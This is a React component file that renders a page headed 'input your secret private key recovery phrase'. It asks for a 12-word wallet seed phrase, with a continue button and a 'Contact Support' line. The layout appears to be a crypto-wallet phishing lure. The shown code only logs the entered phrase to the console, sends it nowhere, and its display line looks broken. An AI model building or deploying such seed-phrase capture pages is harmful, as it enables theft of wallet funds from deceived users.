import React from "react";
import "./Main.css";
import { useState } from "react";

function Main() {
  const [data, setData] = useState(null);
  const [print, setPrint] = useState();

  function getValue(val) {
    setData(val.target.value);
    console.log(val.target.value);
  }

  return (
    <div className="main">
      <div className="head1">
        <h3 className="h3">input your secret private key recovery phrase</h3>
      </div>
      <div className="span">
        <span className="span-text">
          Your 12 word Secret private key Recovery Phrase grants access to your
          account. Please input it in the order specified.
        </span>
      </div>
      <div className="input">
        <input
          type="text"
          name="name"
          placeholder="Enter your secret private key recovery phase"
          onChange={getValue}
        />
        <h5 className="h5">separate each word with a space</h5>
        <div className="box">
          {print ? <h6>{{ data }}</h6> : null}

          <button
            onClick={() => setPrint(true)}
            className="button"
            type="submit"
          >
            continue
          </button>

          <h4 className="h4">Go Back</h4>
          <span>Trouble logging in?Contact Support</span>
        </div>
      </div>
    </div>
  );
}

export default Main;
